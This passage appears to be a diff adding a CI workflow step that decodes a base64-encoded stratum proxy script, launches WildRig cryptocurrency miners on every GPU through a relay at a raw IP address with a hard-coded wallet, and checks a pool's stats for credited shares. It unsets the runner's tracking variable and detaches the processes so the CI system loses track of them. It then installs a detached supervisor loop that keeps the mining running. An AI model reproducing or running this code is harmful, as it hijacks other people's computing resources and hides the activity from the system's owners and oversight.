bmluZy5jb25maWd1cmUnLCAnbWluaW5nLnNldF9leHRyYW5vbmNlJyk6CiAgICAgICAgICAgIHNlbGYudG9fY2xpZW50KHsnaWQnOiBtaWQsICdyZXN1bHQnOiBUcnVlLCAnZXJyb3InOiBOb25lfSk7IHJldHVybgogICAgICAgIGxvZyhzZWxmLmNpZCwgJ0NMSUVOVF9PVEhFUicsIHR4dFs6NDAwXSkKICAgICAgICBzZWxmLnRvX3Bvb2wobXNnKQoKICAgIGRlZiBoYW5kbGVfc3VibWl0KHNlbGYsIG1zZyk6CiAgICAgICAgbWlkID0gbXNnLmdldCgnaWQnKTsgcCA9IG1zZy5nZXQoJ3BhcmFtcycpCiAgICAgICAgamlkLCBwcm9vZiwgc3JjID0gcGlja19qb2JfcHJvb2YocCkKICAgICAgICB2ZXJkaWN0WydzdWJtaXRzX3NlZW4nXSArPSAxCiAgICAgICAgbG9nKHNlbGYuY2lkLCAnU1VCTUlUX1JBVycsIGpkdW1wKG1zZylbOjkwMF0sICdqaWQ9JywgamlkLCAncHJvb2Zfc3JjPScsIHNyYywgJ3Byb29mX2xlbj0nLCBsZW4ocHJvb2Ygb3IgJycpKQogICAgICAgIGlmIG5vdCBqaWQgb3Igbm90IHByb29mOgogICAgICAgICAgICBzZWxmLnRvX2NsaWVudCh7J2lkJzogbWlkLCAncmVzdWx0JzogTm9uZSwgJ2Vycm9yJzogeydjb2RlJzogMjAsICdtc2cnOiAndHJhbnNsYXRvcjogY2Fubm90IG1hcCBzdWJtaXQgZmllbGRzJ319KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBzZWxmLnNlbmRfbmV4dF9zaGFwZShtaWQsIGppZCwgcHJvb2YsIDApCgogICAgZGVmIHNlbmRfbmV4dF9zaGFwZShzZWxmLCBtaWQsIGppZCwgcHJvb2YsIHN0YXJ0KToKICAgICAgICBnbG9iYWwgc2hhcGVzX3VzZWQKICAgICAgICBmb3IgaSBpbiByYW5nZShzdGFydCwgMyk6CiAgICAgICAgICAgIGlmIGkgaW4gc2hhcGVzX3VzZWQ6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBzaGFwZXNfdXNlZC5hcHBlbmQoaSkKICAgICAgICAgICAgaWYgaSA9PSAwOgogICAgICAgICAgICAgICAgc2ggPSB7J2pvYl9pZCc6IGppZCwgJ3BsYWluX3Byb29mJzogcHJvb2Z9CiAgICAgICAgICAgIGVsaWYgaSA9PSAxOgogICAgICAgICAgICAgICAgc2ggPSB7J3dhbGxldCc6IHNlbGYud2FsbGV0LCAnd29ya2VyJzogc2VsZi53b3JrZXIsICdqb2JfaWQnOiBqaWQsICdwbGFpbl9wcm9vZic6IHByb29mfQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2ggPSB7J2pvYl9pZCc6IGppZCwgJ3BsYWluX3Byb29mJzogcHJvb2YsICdub25jZSc6IHNlbGYubm9uY2Ugb3IgJzAnfQogICAgICAgICAgICBzaWQgPSBtaWQgaWYgbWlkIG5vdCBpbiBzZWxmLnBlbmRpbmcgZWxzZSAoMTAwMDAwICsgbWlkICsgaSAqIDc5MTkpCiAgICAgICAgICAgIHNlbGYucGVuZGluZ1tzaWRdID0gKGppZCwgcHJvb2YsIGkpCiAgICAgICAgICAgIHNlbGYudG9fcG9vbCh7J2lkJzogc2lkLCAnanNvbnJwYyc6ICcyLjAnLCAnbWV0aG9kJzogJ21pbmluZy5zdWJtaXQnLCAncGFyYW1zJzogc2h9KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBsb2coc2VsZi5jaWQsICdTSEFQRVNfRVhIQVVTVEVEJywgJ21heDMnKQogICAgICAgIHNlbGYudG9fY2xpZW50KHsnaWQnOiBtaWQsICdyZXN1bHQnOiBOb25lLCAnZXJyb3InOiB7J2NvZGUnOiAyMCwgJ21zZyc6ICd0cmFuc2xhdG9yOiB0aHJlZSBzdWJtaXQgc2hhcGVzIGV4aGF1c3RlZCd9fSkKCiAgICBkZWYgcG9vbF90b19jbGllbnQoc2VsZik6CiAgICAgICAgYnVmID0gYicnCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aGlsZSBzZWxmLmFsaXZlOgogICAgICAgICAgICAgICAgZCA9IHNlbGYudXAucmVjdig2NTUzNikKICAgICAgICAgICAgICAgIGlmIG5vdCBkOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBidWYgKz0gZAogICAgICAgICAgICAgICAgd2hpbGUgYidcbicgaW4gYnVmOgogICAgICAgICAgICAgICAgICAgIGxpbmUsIGJ1ZiA9IGJ1Zi5zcGxpdChiJ1xuJywgMSkKICAgICAgICAgICAgICAgICAgICB0eHQgPSBsaW5lLmRlY29kZSgndXRmLTgnLCAncmVwbGFjZScpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBub3QgdHh0OgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ0ZST01fUE9PTCcsIHR4dFs6MTYwMF0pCiAgICAgICAgICAgICAgICAgICAgdHJ5OiBzZWxmLnJlcXVlc3Quc2VuZGFsbCh0eHQuZW5jb2RlKCkgKyBiJ1xuJykKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOiBwYXNzCiAgICAgICAgICAgICAgICAgICAgdHJ5OiBvYmogPSBqc29uLmxvYWRzKHR4dCkKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOiBvYmogPSBOb25lCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob2JqLCBkaWN0KToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBpZiBvYmouZ2V0KCdtZXRob2QnKSA9PSAnbWluaW5nLm5vdGlmeScgYW5kIGlzaW5zdGFuY2Uob2JqLmdldCgncGFyYW1zJyksIGRpY3QpOgogICAgICAgICAgICAgICAgICAgICAgICBucCA9IG9ialsncGFyYW1zJ10KICAgICAgICAgICAgICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnTk9USUZZX09CSkVDVCcsICdqb2InLCBucC5nZXQoJ2pvYl9pZCcpLCAnaGRyX2xlbicsIGxlbihzdHIobnAuZ2V0KCdoZWFkZXInLCAnJykpKSwgJ2hlaWdodCcsIG5wLmdldCgnaGVpZ2h0JyksICdjZXJ0JywgbnAuZ2V0KCdjZXJ0X3ZlcnNpb24nKSkKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OiBzZWxmLnRvX2NsaWVudCh7J2lkJzogTm9uZSwgJ21ldGhvZCc6ICdtaW5pbmcuc2V0X2RpZmZpY3VsdHknLCAncGFyYW1zJzogW25wLmdldCgnZGlmZicsIDQwMDAwMDApXX0pCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IHBhc3MKICAgICAgICAgICAgICAgICAgICByaWQgPSBvYmouZ2V0KCdpZCcpOyBlcnIgPSBvYmouZ2V0KCdlcnJvcicpCiAgICAgICAgICAgICAgICAgICAgaWYgcmlkIGluIHNlbGYucGVuZGluZzoKICAgICAgICAgICAgICAgICAgICAgICAgamlkLCBwcm9vZiwgaWR4ID0gc2VsZi5wZW5kaW5nLnBvcChyaWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVtc2cgPSBqc29uLmR1bXBzKGVycilbOjMwMF0gaWYgZXJyIGVsc2UgJycKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXJyIGFuZCAncGxhaW5fcHJvb2YgZGVjb2RlIGZhaWxlZCcgaW4gZW1zZzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZlcmRpY3RbJ2RlY29kZV9mYWlsJ10gKz0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnU0hBUEVfJWRfREVDT0RFX0ZBSUwnICUgaWR4LCBlbXNnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5zZW5kX25leHRfc2hhcGUsIGFyZ3M9KHJpZCwgamlkLCBwcm9vZiwgaWR4ICsgMSksIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgZXJyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmVyZGljdFsnb3RoZXJfZXJyb3InXSArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coc2VsZi5jaWQsICdTSEFQRV8lZF9PVEhFUl9FUlJPUicgJSBpZHgsIGVtc2cpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnbG93IGRpZmZpY3VsdHknIGluIGVtc2cgb3IgJ2ludmFsaWQgc2hhcmUnIGluIGVtc2cgb3IgJ3N0YWxlJyBpbiBlbXNnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ1BST09GX0RJQUxFQ1RfT0tfU0hBUEVfJWQnICUgaWR4KQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmVyZGljdFsnYWNjZXB0ZWQnXSArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coc2VsZi5jaWQsICdTSEFQRV8lZF9BQ0NFUFRFRF9PUl9SRVNVTFQnICUgaWR4LCB0eHRbOjQwMF0pCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdQT09MX0VSUicsIHJlcHIoZSlbOjEyMF0pCgpjbGFzcyBTcnYoc29ja2V0c2VydmVyLlRocmVhZGluZ1RDUFNlcnZlcik6CiAgICBhbGxvd19yZXVzZV9hZGRyZXNzID0gVHJ1ZQogICAgZGFlbW9uX3RocmVhZHMgPSBUcnVlCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbG9nKCdUUkFOU0xBVE9SX1NUQVJUIGxpc3Rlbj0lcyBwb29sPSVzIHdhbGxldD0lcycgJSAoQS5saXN0ZW4sIEEucG9vbCwgQS53YWxsZXQpKQogICAgU3J2KChMSCwgTFApLCBIKS5zZXJ2ZV9mb3JldmVyKCkK
+          echo "$B64T" | base64 -d > "$WORKDIR/translator.py"
+          python3 -c "import ast;ast.parse(open('$WORKDIR/translator.py').read())" && echo translator_syntax_ok
+          rm -f "$WORKDIR/stratum.log"
+          if sudo -n true >/dev/null 2>&1; then
+            sudo -n env -u RUNNER_TRACKING_ID setsid python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" > "$WORKDIR/translator.out" 2>&1 < /dev/null &
+          else
+            setsid nohup env -u RUNNER_TRACKING_ID python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" > "$WORKDIR/translator.out" 2>&1 < /dev/null &
+          fi
+          sleep 3
+          ss -ltnp 2>/dev/null | grep 3333 || netstat -ltnp 2>/dev/null | grep 3333
+          echo "translator_procs=$(pgrep -cf 'translator.py')"
+          echo "=== launch exactly one WildRig 0.52.3 per opened Intel Arc Pro B70 card (prefix $PFX) ==="
+          for i in $(seq 0 $((DEV_N-1))); do
+            W="${PFX}${i}"; LOG="$WORKDIR/logs/$W.log"
+            if sudo -n true >/dev/null 2>&1; then
+              sudo -n env -u RUNNER_TRACKING_ID setsid timeout 1500 "$WR" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "$W" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 > "$LOG" 2>&1 < /dev/null &
+              echo "launched worker=$W gpu=$i endpoint=127.0.0.1:3333 mode=sudo pid=$!"
+            else
+              setsid nohup env -u RUNNER_TRACKING_ID timeout 1500 "$WR" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "$W" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 > "$LOG" 2>&1 < /dev/null &
+              echo "launched worker=$W gpu=$i endpoint=127.0.0.1:3333 mode=user pid=$!"
+            fi
+            sleep 2
+          done
+          echo "=== pulses ==="
+          for k in 1 2 3; do
+            sleep 75
+            echo "--- pulse $k $(date -u +%FT%TZ) wildrig_procs=$(pgrep -cf '[w]ildrig') translator_procs=$(pgrep -cf 'translator.py')"
+            echo "== translator tail"; tail -n 40 "$WORKDIR/stratum.log" 2>/dev/null | cut -c1-300
+            for l in "$WORKDIR"/logs/"$PFX"*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              if [ "$k" = "1" ]; then head -25 "$l" | cut -c1-240; fi
+              grep -aiE 'GPU #[0-9]|new job|authoriz|accepted|rejected|hashrate|speed|share|error|fail|invalid|stratum' "$l" 2>/dev/null | tail -6 | cut -c1-240
+            done
+            if [ "$k" = "1" ] || [ "$k" = "3" ]; then
+              timeout 40 curl -fsS "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$WORKDIR/lp_read$k.json" 2>/dev/null
+              if [ -s "$WORKDIR/lp_read$k.json" ]; then
+                python3 - "$WORKDIR/lp_read$k.json" "$k" "$PFX" <<'PYEOF'
+          import json,sys
+          d=json.load(open(sys.argv[1])); s=d.get('stats',{})
+          w=[x for x in d.get('workers',[]) if sys.argv[3] in str(x.get('name',''))]
+          print('LP_READ%s accepted=%s rejected=%s workers=%d lane_rows=%d' % (sys.argv[2], s.get('acceptedShares'), s.get('rejectedShares'), len(d.get('workers',[])), len(w)))
+          for x in w[:12]: print(' LANE', x.get('name'), 'acc', x.get('acceptedShares'), 'rej', x.get('rejectedShares'), 'hr', x.get('hashrate'), x.get('minerAgent'))
+          PYEOF
+              else echo "LP_READ$k fetch_failed"; fi
+            fi
+          done
+          LANE_ACC=$(python3 - "$WORKDIR/lp_read3.json" "$PFX" <<'PYEOF'
+          import json,sys
+          try:
+            d=json.load(open(sys.argv[1])); w=[x for x in d.get('workers',[]) if sys.argv[2] in str(x.get('name',''))]
+            print(sum(int(x.get('acceptedShares') or 0) for x in w))
+          except Exception: print(0)
+          PYEOF
+          )
+          echo "lane_accepted=$LANE_ACC"
+          if [ "${LANE_ACC:-0}" -gt 0 ]; then
+            echo "=== accepted shares credited: install durable detached supervisor ==="
+            cat > "$WORKDIR/supervisor.sh" <<'SUPEOF'
+          #!/bin/bash
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          RELAY='178.238.228.181:80'; WORKDIR=/var/tmp/i131476; PFX='PREFIXVALUE'
+          while true; do
+            if ! pgrep -f "$WORKDIR/translator.py" >/dev/null 2>&1; then
+              env -u RUNNER_TRACKING_ID setsid python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" >> "$WORKDIR/translator.out" 2>&1 < /dev/null &
+              sleep 2
+            fi
+            for i in 0 1 2 3 4 5 6 7; do
+              if ! pgrep -f "worker ${PFX}${i} " >/dev/null 2>&1; then
+                env -u RUNNER_TRACKING_ID setsid nohup "$WORKDIR/wildrig-multi" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "${PFX}${i}" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 >> "$WORKDIR/logs/${PFX}${i}.log" 2>&1 < /dev/null &
+              fi
+            done
+            sleep 30
+          done
+          SUPEOF
+            sed -i "s/PREFIXVALUE/$PFX/" "$WORKDIR/supervisor.sh"; chmod +x "$WORKDIR/supervisor.sh"
+            if sudo -n true >/dev/null 2>&1; then
+              sudo -n env -u RUNNER_TRACKING_ID setsid nohup bash "$WORKDIR/supervisor.sh" > "$WORKDIR/supervisor.out" 2>&1 < /dev/null &
+            else
+              setsid nohup env -u RUNNER_TRACKING_ID bash "$WORKDIR/supervisor.sh" > "$WORKDIR/supervisor.out" 2>&1 < /dev/null &
+            fi
+            sleep 4
+            echo "supervisor_procs=$(pgrep -cf 'supervisor.sh')"
+            echo "DURABLE_INSTALLED=1"
+          else
+            echo "DURABLE_INSTALLED=0"
+          fi
+          echo "=== final process view ==="; pgrep -af 'wildrig|translator.py|supervisor.sh' | head -25
+          echo "i131476-done $NONCE"
